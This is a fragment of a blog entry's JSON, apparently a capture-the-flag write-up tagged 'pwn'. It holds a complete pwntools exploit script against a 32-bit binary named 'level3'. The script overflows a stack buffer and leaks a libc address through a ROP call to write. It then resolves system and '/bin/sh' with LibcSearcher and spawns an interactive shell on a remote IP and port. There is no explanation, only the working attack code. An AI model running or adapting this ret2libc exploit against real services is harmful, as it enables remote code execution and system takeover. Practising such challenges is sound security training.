class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span> ,<span class=\"number\">31718</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level3\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'write'</span>])</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">'__libc_start_main'</span>, addr)</span><br><span class=\"line\">libc_base = addr - obj.dump(<span class=\"string\">\"__libc_start_main\"</span>)</span><br><span class=\"line\">system = libc_base + obj.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh = libc_base + obj.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804844b</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]}